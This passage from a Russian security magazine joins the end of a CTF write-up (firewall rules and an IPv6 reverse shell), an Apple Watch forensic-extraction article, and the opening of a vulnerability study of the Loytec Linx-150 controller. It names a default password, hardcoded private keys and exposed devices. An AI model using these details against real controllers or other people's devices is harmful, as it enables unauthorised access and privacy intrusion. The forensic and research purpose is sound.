сниффящий входящие пакеты ICMP).





                         ICMPShell.py в динамике


iptables
Раз уж мы захватили root, в качес тве вишенки на торте посмотрим на правила
iptables.



  root@Mischief:~# iptables ‐L
  Chain INPUT (policy ACCEPT)
  target     prot opt source               destination
  ACCEPT     udp  ‐‐  anywhere             anywhere             udp spt:
  snmp
  ACCEPT     udp  ‐‐  anywhere             anywhere             udp dpt:
  snmp
  DROP       udp  ‐‐  anywhere             anywhere
  ACCEPT     tcp  ‐‐  anywhere             anywhere             tcp dpt:
  ssh
  ACCEPT     tcp  ‐‐  anywhere             anywhere             tcp dpt:
  3366
  DROP       tcp  ‐‐  anywhere             anywhere


  Chain FORWARD (policy ACCEPT)
  target     prot opt source               destination


  Chain OUTPUT (policy ACCEPT)
  target     prot opt source               destination
  ACCEPT     udp  ‐‐  anywhere             anywhere             udp dpt:
  snmp
  ACCEPT     udp  ‐‐  anywhere             anywhere             udp spt:
  snmp
  DROP       udp  ‐‐  anywhere             anywhere
  ACCEPT     tcp  ‐‐  anywhere             anywhere             tcp spt:
  ssh
  ACCEPT     tcp  ‐‐  anywhere             anywhere             tcp spt:
  3366
  DROP       tcp  ‐‐  anywhere             anywhere


Разрешен только snmp, ssh и 3366 TCP на вход и выход. А вот что мы увидим,
если попросить правила для ip6tables.



  root@Mischief:~# ip6tables ‐L
  Chain INPUT (policy ACCEPT)
  target     prot opt source               destination


  Chain FORWARD (policy ACCEPT)
  target     prot opt source               destination


  Chain OUTPUT (policy ACCEPT)
  target     prot opt source               destination


Все  разрешено!  Это  объясняет,  почему мы  смогли  получить  IPv6‐
реверс‐шелл и обло мались с IPv4.



      «Локи — хитрейший лгун, бог озорс тва и обма на, самый оча рова тель-
     ный из всех богов скандинав ской мифологии».





                             Трофей
ВЗЛОМ





                                                                             Олег Афонин
                                                                                     Эксперт по мобильной
                                                                                   криминалистике компании
                                                                                        «Элкомсофт»
                                                                                             aoleg@voicecallcentral.com

    ЧАСЫ
НАИЗНАНКУ

           ИЗВЛЕКАЕМ И АНАЛИЗИРУЕМ
                ДАННЫЕ APPLE WATCH





Apple Watch — одна из самых популярных в мире марок
умных  часов. Последняя  их  версия  оснащена  полным
набором датчиков и процессором, мощность которого пре‐
восходит бюджетные (и даже не очень бюджетные) модели
смартфонов. При помощи часов Apple собирает огромные
массивы данных. Что происходит с этими данными, где они
хранятся и как их извлечь? Попробуем разобрать ся.


За последние несколь ко лет популярность разнообразных тре керов и умных
часов значительно возросла. В 2018 году был продан 141 миллион умных
часов, что почти вдвое превыша ет результат предыдущего года. Среди все го
разнообразия моделей выделяется линей ка Apple Watch, продажи которых
в 2018 году составили 22,5 миллиона единиц. Уже нес колько лет суммарная
доля всех моделей Apple Watch лишь немного не дотягивает до половины
на глобальном рынке.
  Первая версия часов Apple Watch была выпущена в 2015 году. В сле‐
дующем году на замену первому поколению часов пришло поколение Series 1
, которое вышло одновременно с вер сией Series 2. На сегодняшний день
актуальная модель — четвертая (по факту пя тая) версия Apple Watch 4. Все
версии часов от Apple работают под управлением специализированной опе‐
рационной системы WatchOS, код  которой,  в свою оче редь, основан
на мобильной системе iOS.


             INFO

                        Статья написана в соавторстве с Мат тиа Эпи‐
                       фани. Маттиа — основатель итальянской ком‐
                      пании REALITY NET, консультант в сфере циф‐
                      ровой криминалистики и мобильной безопас‐
                         ности, инструктор курсов SANS и соавтор книги
                         Learning iOS Forensics.



ПОЧЕМУ APPLE WATCH?
В отличие от подробно исследованных смартфонов iPhone и других устрой‐
ств, работающих под управлением операционной системы iOS, часы Apple
Watch заинтересовали лишь небольшое число экспертов. Первой работой,
описывающей структуру данных Apple Watch, стала публикация Хизер Махалик
(Heather  Mahalik)  и  Сары  Эдвардс  (Sarah  Edwards),  опубликованная
в 2015 году (PDF). С тех пор сравнимых по масшта бу исследований часов
от Apple не проводилось.
  Последние версии часов Apple Watch оснащены большим числом раз‐
нообразных дат чиков. Здесь и дат чик атмосферного давления, и шагомер,
и дат чик пульса, и чувствитель ные инерционные дат чики, и датчик магнитного
поля, и полноценный чипсет для определения координат по спутникам GPS,
GLONASS и Galileo, и даже датчик для снятия электрокардиограмм. Многие
из этих датчиков работают пос тоянно, но некото рые включаются лишь пери‐
одически. Пример — датчик для определения местоположения, который
активируется лишь в те моменты, когда WatchOS считает, что ты вышел
на пробежку.
  С учетом того что часы обо рудованы 8 Гбайт встроенной памяти, логично
было бы ожидать, что по крайней мере часть собранных данных сохраня ется
в часах. Часы ведут пол ноценные логи, формат которых совпадает с фор‐
матом аналогич ных логов iPhone. Кроме того, на часах могут быть многочис‐
ленные циферблаты, на них можно уста навливать приложения (в том числе
сторонние, из магазина), синхро низировать фотографии. Часы получают уве‐
домления с телефона, причем в них может содержаться часть сообщения.
С часов можно слушать музыку, зарегистрироваться на рейс и пройти
посадочный контроль при помощи посадочного талона в виде QR‐кода.
Часами можно оплачивать покупки. На часах работает голосовой помощник
Siri. Если же речь идет о версии часов с LTE, то с часов можно и позвонить.
  Иными словами, часы Apple Watch умеют делать многое из того, что может
делать и обычный смартфон. Есть ли воз можность добраться до всех этих
данных?
  Информацию из часов мож но извлечь тремя раз ными способами. Во‐пер‐
вых, извлечь резер вную копию Apple Watch из локаль ной или облачной резер‐
вной копии подклю ченного к часам iPhone. Во‐вто рых, часы можно подклю‐
чить напрямую к компьютеру, используя переходник, после чего извлечь дан‐
ные методом логического ана лиза. Наконец, некоторые данные возможно
достать из облака iCloud (в первую очередь речь идет о данных «Здоровья»
пользователя, которые собирают часы).
  Каждый из этих способов возвра щает свой собс твенный набор данных,
отличный от того, который можно получить дру гими способами. Данные час‐
тично пересекаются, но мы рекомендуем по возможности использовать все
три способа для максимально полного извлечения.


АНАЛИЗ РЕЗЕРВНОЙ КОПИИ IPHONE
Часы Apple Watch независимо от поколения аппаратной платформы и версии
WatchOS обладают возможностью создавать резервную копию данных. Тем
не менее WatchOS не позволяет использовать сервис для создания резер‐
вных копий ни сторонним приложениям, ни даже программе iTunes. Резер‐
вные копии часов создаются только и исключительно в подключенном к часам
смартфоне iPhone.
   Согласно документации Apple, содержимое Apple Watch автомати чески
копируется на сопряженное устройство iPhone, чтобы данные Apple Watch
можно было восстановить из этой резервной копии. К сожалению, нам неиз‐
вестен способ, которым можно было бы форсировать создание свежей
резервной копии часов в iPhone, за исключением одного: отсоеди нить часы
от iPhone, разорвав пару. В статье Apple «Резервное копирование данных
Apple Watch» подробно описано, что входит, а что не входит в состав резер‐
вных копий часов.

Вот что включает резервная копия данных Apple Watch:
 • данные (для встроенных программ) и настройки (для встроенных и сторон‐
   них программ);
 • расположение программ на экра не «Домой» и настройки циферблата;
 • настройки панели Dock и основные системные настройки;
 • медицинские данные и данные о физической активности;
 • настройки уве домлений;
 • плей‐листы, альбомы и миксы, синхронизируемые на Apple Watch, и нас‐
   тройки музыки;
 • настройки параметра Siri «Аудиоотзыв» для Apple Watch Series 3 или более
   поздних моделей;
 • синхронизированный фотоальбом;
 • часовой пояс.

Вот что не входит в резервную копию данных Apple Watch:
 • записи сопряжения Bluetooth;
 • данные кре дитных или дебето вых карт для пла тежей Apple Pay, сохранен‐
  ные на Apple Watch;
 • код‐пароль к часам Apple Watch.

Таким образом, резервную копию  часов  Apple  Watch можно  извлечь
из  iPhone. Самый простой спо соб это сделать — создать локальную
или облачную резервную копию iPhone, пос ле чего проанализировать ее
содержимое. Мы не будем подробно оста навливаться на процедуре соз‐
дания резервных копий (они многократно описывались на нашем сай те);
отметим только, что для соз дания свежей резервной копии можно исполь‐
зовать iTunes или одну из сто ронних прог рамм, но мы вос пользовались ути‐
литой Elcomsoft iOS Forensic Toolkit (она же пригодится позже и для извле‐
чения данных из часов, подклю ченных к компь ютеру через переходник).
   Итак, резервная копия iPhone создана, осталось найти в ней резервную
копию часов Apple Watch. Для это го мы вос пользуемся дву мя утилитами:
iBackupBot (доступна для Windows и MacOS) и SQLite Expert для Windows.
   Начнем с анализа спецификаций устройства. Для этого откроем резер‐
вную копию iPhone в приложении iBackupBot.
  В папке \HomeDomain\Library\DeviceRegistry.state находятся сле‐
дующие файлы:
 • historySecureProperties.plist;
 • stateMachine‐.PLIST;
 • activestatemachine.plist;
 • history.plist.





В файле historySecureProperties.plist хра нится серийный номер часов,
уникальный идентификатор UDID (UniqueDeviceIdentiﬁer), MAC‐адреса адап‐
теров Wi‐Fi и Bluetooth подклю ченных к телефону часов Apple Watch.





Файл  stateMachine‐<GUID>.plist  хра нит информацию о  сопряжении
с iPhone (обычно значение PairSuccess), версию операционной сис темы
WatchOS и время сопряжения с телефоном (записанное в формате Apple Co‐
coa Core Data).





Файл activestatemachine.plist содержит информацию, подобную той, что
в файле stateMachine‐<GUID>.plist, только она допол нена данными о вер‐
сии WatchOS, установленной на часах в момент создания резервной копии.





В папке \HomeDomain\Library\DeviceRegistry лежит директория, имя
которой включает GUID из файла stateMachine‐<GUID>.plist: именно
в этой директории хранятся данные из резервной копии Apple Watch.





В  папке NanoAppRegistry содержится информация об  установленных
на часах приложениях. На скриншоте ниже можно увидеть информацию
о приложении Facebook, вклю чая данные Bundle Version, Display Name, Bundle
Identiﬁer и Bundle Name. К сожалению, данных приложе ния в резервной копии
часов нет, только информа ция о приложении.





В базе данных NanoMail\Registry.sqlite хра нится информация о почтовых
учетных записях, которые син хронизируются с часами.
  В частности, в таблице SYNCED_ACCOUNT можно найти записи Display
Name и Email Address для каж дого почтового аккаунта, который синхронизи‐
руется с устройством. Ни пароля, ни маркера аутентификации от почтовых
аккаунтов в резервной копии нет.





В таблице MAILBOX можно просмотреть, как организована почта, пролистать
папки и подпапки для каждой учетной записи («Входящие», «Исходящие»,
«Черновики», «Архив» и так далее).





В  базе  NanoPasses\nanopasses.sqlite3  содержится  спи сок  записей
из приложения Wallet. Программа Wallet — уни версальное хранилище кредит‐
ных, дебетовых и предоплаченных карт, а также карт магазинов, посадочных
талонов, билетов в кино, купонов, бонусных карт, студенческих удостовере‐
ний и так далее. Записи Wallet синхро низируют ся с часами. В частнос ти, часы
можно использовать для отображения QR‐кода посадочных талонов для их
удобного сканирования при посадке на рейс. Для каждой записи доступны
данные Type_ID, название организации Organization Name, дата Ingest Date (в
формате Apple Cocoa Core Data) и описание Description.





В некоторых записях доступно поле Encoded Pass, в котором содержится дво‐
ичный файл  plist с дополнительной информацией (например, описанный
выше QR‐код посадочного талона). Такие файлы мож но извлечь из базы дан‐
ных и открыть при помощи программы для работы с plist (например, plist
Editor).
  На следующем скрин шоте можно уви деть запись брони гостиницы через
Booking.com. Поле Encoded Pass можно открыть в SQLiteExpert и сохранить
в виде файла.





Далее файл открываем в plist Editor и извлекаем информацию о брони, вклю‐
чая имя гостя, название и адрес гостиницы, даты заез да и выезда, стоимость
и номер брони.





В папке NanoPreferencesSync хра нятся различные файлы, отвечающие
за настройки Apple Watch. Наибольший интерес здесь представляет папка
\Backup\Files\, в которой содер жится информация о циферблатах и их нас‐
тройках, включая изоб ражения.





Все эти файлы представляют собой обычные архивы в формате ZIP.





В каждом архиве лежат:
 • Face.json с детальными настройками циферблата, включая дату его соз‐
   дания (как обыч но, в формате Apple Cocoa Core Data);
 • папка Resources с изоб ражением циферблата в формате JPEG, а также
  файл Images.plist, в котором хра нятся метаданные.





Ито ги
Проанализировав резервную копию часов из iPhone, мы получили достаточно
скромный результат. Настройки системы и приложений, талоны из Wallet, нас‐
тройки почтовых учетных записей, циферблаты. Никаких логов, никаких цифр
с показаниями датчиков, уведомлений или истории местоположения поль‐
зователя; никаких данных из песочниц сто ронних при ложений. Строго говоря,
мы вообще не узнали ничего интерес ного сверх того, что могли бы узнать,
проанализировав  резервную  копию  сопряженного  с  часами  iPhone,
из которой мы, собственно, и извлекли резервную копию часов.


ИЗВЛЕЧЕНИЕ ДАННЫХ ИЗ APPLE WATCH ЧЕРЕЗ АДАПТЕР
Более сложный способ извлечь информацию из Apple Watch — подключить их
к компьюте ру специализированным переходником, правильное подсоеди‐
нение которого к часам поистине ювелирная работа. В любом случае обя‐
зательно выполнить два требования:
 1. Каким‐то образом подключить часы к компьютеру. И если для Apple Watch
   S1, S2 и S3 есть готовые адаптеры IBUS, то для часов последней серии
   нужного адаптера мы не нашли.
 2. Когда часы подсоединятся к компьютеру, потребуется создать доверен‐
   ное соединение — точно так же, как и с iPhone. И точно так же, как и в слу‐
   чае с iPhone, для это го нужно будет раз блокировать часы кодом блокиров‐
   ки. Если этого не сделать, то свя зать часы с компьютером не получится.

И даже после всего перечисленного тебе не удастся извлечь образ фай‐
ловой системы! Все, что тебе будет доступно, — это несколько сервисов,
через которые можно попробовать извлечь часть типов данных. С учетом все‐
го этого неудивительно, что извлечени ем данных из часов Apple Watch мало
кто занимается.
   Что же вообще можно выудить из часов при прямом под ключении? Дос‐
тупны всего три типа данных:
 1. Информация об устройстве и список установленных приложе ний.
 2. Файлы через протокол AFC (Apple File Conduit).
 3. Лог‐файлы.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ЧАСЫ НАИЗНАНКУ
                     ИЗВЛЕКАЕМ И АНАЛИЗИРУЕМ
                          ДАННЫЕ APPLE WATCH





Под ключение к компьюте ру
Нам удалось найти переходники для первых трех поколений часов; для Apple
Watch 4 такого адаптера нет. Диагностический порт в часах Apple Watch
находится под креплением для ремешка; потребуется тонкая игла или скреп‐
ка для того, чтобы открыть крышку. Используемый нами адаптер носит наз‐
вание IBUS: IBUS for Apple Watch S1 и IBUS for Apple Watch S2 and S3.





Правильно подсоединить адаптер к часам может быть сложно. Тем не менее
это возможно.





Так же как и для iPhone, приложение iTunes запросит разрешение на соз‐
дание доверенного соединения с компь юте ром.





iTunes отобразит информа цию о часах (только версия ОС и уникальный иден‐
тификатор часов).





Теперь запускаем Elcomsoft iOS Forensic Toolkit.





Список приложе ний, установленных на часах, извлекается командой I (Device
Info) и сохраняется в файл.





На диске (обычно в том же каталоге, куда уста новлен iOS Forensic Toolkit) соз‐
дается три файла:
 • Ideviceinfo.plist;
 • Applications.txt;
 • Applictions.plist.

В файле  ideviceinfo.plist  содержится  вся  доступная информация
по Apple Watch, включая точный идентификатор модели (Hardware Model),
версию операционной системы WatchOS, серийный номер часов (Serial Num‐
ber), UDID, название устройства (Device Name), MAC‐адре са адаптеров Wi‐Fi
и Bluetooth, часовой пояс и время на момент извлечения данных.





Также в файле есть информация о свободном и общем объ еме накопителя
и размере системного раз дела (атрибуты Total Disk Capacity, Total System Ca‐
pacity, Total Data Capacity, Total Data Available). Наконец, атрибуты Language
и Locale содержат информа цию о выбранном язы ке и региональных нас трой‐
ках.





Список установленных на часах приложений сохраняется в файл Applica‐
tions.txt. Сюда попада ют такие данные, как Bundle Identiﬁer (уникальный
идентификатор приложения), Bundle Version и Bundle Display Name (наз вание
приложения в том виде, как оно отображается на часах).





Детальная информация о каждом  уста новленном приложении доступна
в файле Applications.plist (ты помнишь, какой ути литой его просмотреть).
Здесь  содержится информация о  точном  пути  в файловой  системе,
по которому установлено приложение и пути к его песочнице (Application Path
и Container соответственно). Обра ти внимание: дос тупа к файловой сис теме
часов у нас нет, так что доступа к данным из песочницы мы не получим.
Как выглядит информация о приложении Uber, можно посмотреть на скрин‐
шоте ниже.





Скопировать файлы системных журналов мож но командой L (Logs).





Анализ лог‑файлов часов
Итак, мы извлекли лог‐файлы из часов. Более подробно почитать о лог‐фай‐
лах iOS можно в статье Using Apple «Bug Reporting» for forensic purposes Мат‐
тиа Эпифани (Mattia Epifani), Хизер Махалик (Heather Mahalik) и Адриана
Леонга (Adrian Leong, Cheeky4n6monkey). В статье рассказывается о том,
как использовать профили sysdiagnose для извлечения данных из раз личных
устройств Apple. Попробуем использовать тот же подход с часами.





Скрипты для анализа данных sysdiagnose можно ска чать с GitHub. Наиболь‐
ший интерес представляют следующие системные журналы.





MobileActivation содержит информацию о версиях ОС и времени их уста‐
новки, модели устрой ства и типа продукта. Здесь также хранится детальная
информация об обновлениях WatchOS. На скриншоте ниже показана работа
скрипта с журналом Mobile Activation.





MobileContainerManager  представляет  интерес  тем,  что  содержит
информацию об удалении приложений с часов. Проанализировав журнал,
можно понять, какие приложения могли использовать ся на часах в интересу‐
ющий    период    времени.   Ниже    показан    парсинг    журнала
MobileContainerManager.





MobileInstallation ана логичен предыду щему, но информация здесь не об
удалении, а об установке приложений на часы.





Но интереснее всего, пожалуй, журнал PowerLog. Здесь хранится информа‐
ция о взаимодействии пользователя с часами. Часы лежали на зарядке? Их
взяли в руки? Надели на запястье? Пользователь активировал экран? Именно
этот журнал  в первую очередь  стараются проанализи ровать эксперты
при расследовании автомобильных ава рий. Если водитель отвлекся на часы
(или включил экран телефона, в нем тоже есть ана логичный лог) в момент
аварии, это будет свидетельствовать против него (в США есть понятие Dis‐
tracted Driving. Для информации: в результате distracted driving на аме рикан‐
ских дорогах в 2017 году погибло более трех тысяч человек). Из‐за особой
важности структура этой базы данных отлично изучена. Можно почитать, нап‐
ример, статью Сары Эдвардс (PDF) или воспользоваться готовым инструмен‐
тарием APOLLO.





Наконец, логи Wi‐Fi содержат список сетей, к которым подключались часы.
Проще  все го просмотреть содержимое фай ла com.apple.wifi.plist,
в котором инте рес представляют записи о SSID, BSSID и дате последнего
подклю чения к данной сети. Особый интерес представляет параметр BSSID,
который можно использовать для определения точного местоположения
(радиус 15–25 метров) в момент подключения к сети. Для опре деле ния коор‐
динат точки доступа Wi‐Fi по ее BSSID можно восполь зоваться одним из сер‐
висов reverse lookup, например Wigle.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ЧАСЫ НАИЗНАНКУ
                     ИЗВЛЕКАЕМ И АНАЛИЗИРУЕМ
                          ДАННЫЕ APPLE WATCH





Доступ к медиафайлам
О доступе к медиафайлам стоит рас сказать подробнее. Извлечь медиафайлы
можно командой M (Media). Интерес представляют не столько сами фотог‐
рафии, сколько база данных Photos.sqlite.





Практически единственный способ получить доступ к медиафайлам из часов
Apple Watch тре бует использования утилиты, работающей по протоколу AFC
(Apple File Conduit). При этом часы дол жны быть подключены к компьютеру,
а между компьюте ром и часами  уста новлены доверенные  отношения
(pairing).
   Как было показано в предыдущем раз деле, меди афайлы легко извлечь
командой M (Media Files) программы iOS Forensic Toolkit. Казалось бы, все
просто: медиафайлы — это фотографии и, воз можно, видеоролики; что инте‐
ресного может найтись в файлах с часов? Оказыва ется, инте ресного доволь‐
но много — и основной интерес представляют вовсе не сами фотографии.
  Ниже показана структура папок, создаваемая после извле чения меди‐
афайлов по протоколу AFC.





Собственно изображения (в сильно умень шенном по сравнению с оригина‐
лами виде) попадают в папку DCIM; здесь без сюрпризов.





Несмотря на то что изоб ражения значительно уменьшены (странно было бы
передавать на часы полнораз мерные фотографии), система сохраняет в них
метатеги EXIF, что позволяет определить такие параметры, как точное время
съемки и устройство, использовавшееся для фотографии.





В папке iTunes_Control\iTunes содержится весьма инте ресная база дан‐
ных MediaLibrary.sqlitedb. Сюда же входят и соответству ющие файлы
SHM (Shared Memory) и WAL (Write Ahead Log). Сама база данных, как очевид‐
но из названия, хранится в формате SQLite (как, впрочем, и все остальные
базы данных на часах). В этой базе лежат такие данные, как iCloud ID поль‐
зователя, а также список покупок в магазине iTunes (покупки музыки, фильмов
и электронных книг). Что интерес но, в этом файле хранится информация
о покупках, совершенных со всех устройств поль зователя, зарегистрирован‐
ных в данной учетной записи.





В базе данных 36 таблиц. Идентификатор пользователя iCloud ID хранится
в таблице _MLDatabaseProperties.





Чтобы извлечь из базы данных какую‐то осмысленную информацию, сфор‐
мируем запрос SQL:


select
  ext.title AS "Title",
  ext.media_kind AS "Media Type",
  itep.format AS "File format",
  ext.location AS "File",
  ext.total_time_ms AS "Total time (ms)",
  ext.file_size AS "File size",
  ext.year AS "Year",
  alb.album AS "Album Name",
  alba.album_artist AS "Artist",
  com.composer AS "Composer",
  gen.genre AS "Genre",
  art.artwork_token AS "Artwork",
  itev.extended_content_rating AS "Content rating",
  itev.movie_info AS "Movie information",
  ext.description_long AS "Description",
  ite.track_number AS "Track number",
  sto.account_id AS "Account ID",
  strftime('%d/%m/%Y %H:%M:%S', datetime(sto.date_purchased + 978397
200,'unixepoch'))date_purchased,
  sto.store_item_id AS "Item ID",
  sto.purchase_history_id AS "Purchase History ID",
  ext.copyright AS "Copyright"
from item_extra ext
  join item_store sto using (item_pid)
  join item ite using (item_pid)
  join item_stats ites using (item_pid)
  join item_playback itep using (item_pid)
  join item_video itev using (item_pid)
  left join album alb on sto.item_pid=alb.representative_item_pid
  left join album_artist alba on sto.item_pid=alba.representative_
item_pid
  left join composer com on sto.item_pid=com.representative_item_pid
  left join genre gen on sto.item_pid=gen.representative_item_pid
  left join item_artist itea on sto.item_pid=itea.representative_
item_pid
  left join artwork_token art on sto.item_pid=art.entity_pid

Этот запрос извлечет детальную информа цию о покупках пользователя,
вклю чая название продукта (например, наз вание фильма, музыкального аль‐
бома  или  электронной  книги),  размер файла,  длительность  звучания
или просмотра композиции, дату покуп ки и идентификатор истории покупок.
Если купленный файл хранит ся на самих часах, здесь же будет и имя файла.





Купленные файлы (на примере ниже это музыка) можно обнаружить в папке
Purchases:





Интерес представляет и папка PhotoData, в которой хранятся метаданные
синхронизированных фотографий. Наибольший интерес представляют база
данных Photos.sqlite и папка Thumbnails.





В базе Photos.sqlite содержится информация о фотографиях, которые хра‐
нятся на часах. Детальное описание структуры базы доступно здесь. Готовые
запросы SQL можно ска чать здесь.
  Наконец, в папке Thumbnails хранятся умень шенные превью изображений
на Apple Watch. Формат ITHMB можно преобра зовать в привычный JPEG
при помощи утилиты iThmb Converter.





Ито ги
Через переходник мы получили даже меньше информации, чем при анализе
резервной копии часов. Тем не менее ценность этих данных несравнимо
выше, чем данных из резервной копии: для получения доступа ко всей этой
информации нам не нужен связанный с часами iPhone — вполне достаточно
самих часов. Многие данные уникальны; осо бо ценны логи часов вооб ще
и логи PowerLog в частности, а также талоны из приложения Wallet.
  Можно ли извлечь боль ше? Да, можно, если для часов будет дос тупен
джейлбрейк. Для актуальных версий WatchOS джейлбрейка сейчас не сущес‐
твует. Единственной попыткой было приложение jelbrekTime (именно в таком
написании) для WatchOS 4.0–4.1.
  Ситуация может измениться в ближайшее время. Для WatchOS 4.0–
5.1.2 анонсирован джейлбрейк  Brenbreak, который обещают выпустить
для всех актуальных версий часов до конца 2019 года. Мы с нетерпением
ожидаем выхода джейлбрейка, чтобы снять наконец образ файловой системы
часов и посмотреть, что там найдется.





ДОСТУП ЧЕРЕЗ ОБЛАКО
Что еще можно извлечь из часов? С техничес кой точки зрения из самих
часов — ничего, но из обла ка iCloud можно извлечь часть информации,
которую iPhone получает именно от часов Apple Watch. Речь о данных «Здо‐
ровье», в состав которых входит счетчик шагов, данные со встроенного
в часы навигатора GPS, данные сердцебиения поль зователя и сня тые элек‐
трокардиограммы, а также дру гие типы данных, для получения которых могли
использоваться сторон ние приложения.
  Для доступа к информации необходим Elcomsoft Phone Breaker, инструк‐
ция — Download Health data from iCloud (извлекаются даже те данные,
которые Apple не отда ет по запросу от пра воохранительных органов).
Для просмотра данных можно воспользоваться Elcomsoft Phone Viewer.





Мы уже писали о процедуре извлечения данных «Здоровья»; не будем пов‐
торяться, просто приведем ссылку на опубликованную статью: «Как Apple
и Google защищают «здоровье» пользователей. Извле каем и сравниваем
данные Apple Health и Google Fit».


ЗАКЛЮЧЕНИЕ
Извлечение и анализ данных часов Apple Watch — достаточно новая и мало‐
изученная тема. В то же время ряд вещей (например, журнал PowerLog) пред‐
ставляют исклю чительный интерес для экспертов‐криминалистов. Уже извес‐
тны несколько случаев, когда успешно раскрывались прес тупления, во время
совершения которых преступник оставлял смартфон дома, но забывал снять
часы или тре кер, и они продолжали записывать информацию.
  К сожалению, при исследова нии дос тупны ми для часов методами нам
не удалось добраться до журнала с историей мес тоположения (часы Apple
Watch оборудуются авто номным датчиком GPS, который автомати чески вклю‐
чается, если WatchOS считает, что пользователь начал тренировку). Не уда‐
лось получить доступ и к данным уста новленных на часах приложений.
Отсутствие полноценной службы резервного копирования не поз воляет соз‐
дать свежую резервную копию часов ина че, чем отвязав их от смартфона
iPhone (причем в момент, когда часы подключены к телефону через Bluetooth
или Wi‐Fi). Отсутствие в продаже адап теров для подключения к компьютеру
актуальной версии Apple Watch 4 делает невоз можным извлечение жизненно
важных журналов.
  Иными словами, исследование Apple Watch только начинается.
ВЗЛОМ
ИЗУЧАЕМ
    ПЛК


                      КРАТКИЙ ГАЙД
          ПО ПОИСКУ УЯЗВИМОСТЕЙ
     В ПРОМЫШЛЕННЫХ КОНТРОЛЛЕРАХ





Если  ты  думаешь,   что  контроллеры,
которые ставят в зданиях и на заводах,
защищены намного лучше, чем домаш ние
гаджеты, то эта статья тебя разубе дит. Я
возьму девайс под названием Linx‐150 и на           Егор Литвинов
его примере покажу, как работать с ПЛК
на Linux. По этой схеме ты смо жешь пов‐
торить  исследова ние  с любым  другим
устройством.


Пару лет назад я написал две статьи — одну о системах управления зданиями
(BMS), вторую — о том, как их мож но поломать со стороны конечных устрой‐
ств. Но время идет, интеграция проникает все глубже, и тот же KNX уже отве‐
чает не только за ﬁeld level, его спокойно можно встре тить и на automation
level.
  В интернете попада ются интересные статьи о том, как реверсить IoT‐
устройство или IP‐камеру. На мой взгляд, у индустри ального железа (пра‐
вильный тер мин АСУ ТП, на английском ICS) отличий от них нет. За исклю‐
чением разве что цены и возможно го импакта атаки. Одно дело — устроить
внезапную светомузыку у кого‐то дома, другое — в терминале аэропорта.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.


Итак, перед нами Loytec Linx‐150. Спасибо Дмитрию Викторову из «Сен‐
сорматики», который предоставил нам экземпляр для изу чения.





С чего начинать работу с таким устройством? Как бы банально это ни зву‐
чало, но первым делом идем на официальный сайт и читаем подробнос ти.
Здесь меня ждал небольшой сюрприз: прос то так эту железку не найти, пос‐
кольку она как бы старая и уже сня та с производс тва. Почему «как бы»? Сей‐
час расскажу.
   Углубившись в сайт, я нашел вот такую страничку. Здесь есть разные
руководства и даташиты, но главное не это.





Файлик со словом ﬁrmware в названии сра зу же привлек мое внимание. Внут‐
ри нашелся целый набор про шивок для раз ных устройств.





Надо отдать должное вендору: хоть Linx‐150 уста ревший и снят с производс‐
тва, но новые прошивки все равно есть. Когда устройство попало ко мне
в руки, актуальной прошивкой была 6.4.6, а на момент написания статьи —
уже 6.4.10, датированная 24 мая 2019 года. То есть девайс, может быть, и не
продается, но активно поддерживается. А это, скорее всего, означает, что он
распространенный.
   Чтобы проверить эту теорию, заглянем в Shodan, Zoomeye и Censys и пос‐
мотрим, как много Linx‐150 и других железок Loytec доступно из интернета.
А то, может, ты скажешь: «Ну крут, ломанул желез ку, а она нигде не исполь‐
зуется, кроме как у кого‐то дома!»
   Чтобы не быть голословным, вот нес колько скриншотов, по которым
понятно, что устрой ств Loytec в мире предос таточно.





Пока я делал скрин шоты, «случайно» нашел очередную железку, к которой
подходят дефолтные креды.





Тем  временем  скачался  архив  с  про шивками.  Находим  нужную —
linx_at91_6_4_10_20190524_0940.dl.
  Первая мысль: это что еще за .dl и что с ним делать? Но старый добрый
binwalk подскажет, что внутри. Заод но, чтобы распаковать содержимое,
используем ключ ‐e.


$ binwalk ‐e linx_at91_6_4_6_20190213_1030.dl

После распаков ки выяс няется, что загадочный .dl — это архив с пакетами
.deb.





Поскольку изначально я разбирал 6.4.6, а когда начал писать эту статью, уже
вышла 6.4.10, поступлю просто и буду разбирать фичи баги, которые встре‐
чаются и там и там. Тем более что мои сомнения, не станет ли вдруг
в 6.4.10 все хорошо, оправда лись.
  В целом различий между 6.4.6 и 6.4.10 не наблюдается, кроме ключевого
файла linx‐at91‐primary_6.4.10_arm.opk.





              Содержимое прошивок 6.4.6 и 6.4.10

Надеюсь, у тебя в закладках браузера давно поселились Vulners и CVE Detail
(если нет, сроч но исправляй!). Они позволят нам понять, насколько все
печально в исследуемых прошивках. Как видишь, очень много старых версий
пакетов.





И это лишь некоторая часть из них. С одной стороны, на этом исследование
можно было бы и закончить, но если уж копать, то надо идти глубже.
   Как понять, какие бинар ники зас луживают внимания в первую очередь? Я,
конечно, мог бы напустить тумана и ска зать, что для этого нужны годы опы та,
особое чутье и ежедневные духовные практики. Но подсказка лежит на виду:
у нас есть две версии прошивок (6.4.6 и 6.4.10) и отличается в них один файл
linx‐at91‐primary_xxx. Про еще одну подсказку поговорим, когда будем
смотреть веб‐интерфейс и заходить по SSH.
  Применяем binwalk к этим файлам и смот рим, что получилось.





Думаю, ты уже узнаёшь знакомые папки и заметил, что железка работает
под управлением Linux. «Рас куривать» структуру папок можно по‐разному, и у
каждого свои трюки, но поделюсь своими шагами. Для начала поищем строки
со словами private и password. Зву чит банально, но мы же работаем
с индустриальным контроллером, а в этой области обычно все надежно
и дубово.
  Результат работы команды можешь видеть на скриншоте ниже.


$ grep ‐ri "private" /path/to/search





Кажется, зря я это сделал! У нас сра зу обна ружи лась пара приватных клю‐
чей — для opcua и ssl. Также где‐то фигурируют слова password и loytec4u.
Поскольку я уже полистал ману алы к Linx‐150, я узнал, что loytec4u —
это дефолтный пароль для входа.
   Что  такое  opcua?  «Википедия»  подска зывает,  что  OPC  Uniﬁed
Architecture — это «спецификация, определяющая передачу данных в про‐
мышленных сетях и взаимо действие устройств в них. Разработана промыш‐
ленным консорциумом OPC Foundation и значительно отличается от его пред‐
шествующих спецификаций».
  Помимо того что у нас тут есть приватные ключики, так они еще и не меня‐
ются от прошивки к прошивке!





С уверенностью могу сказать, что одни и те же клю чи для opcua используются
в прошивке 6.1.2 (которая установлена на самом Linx‐150) и в скачан‐
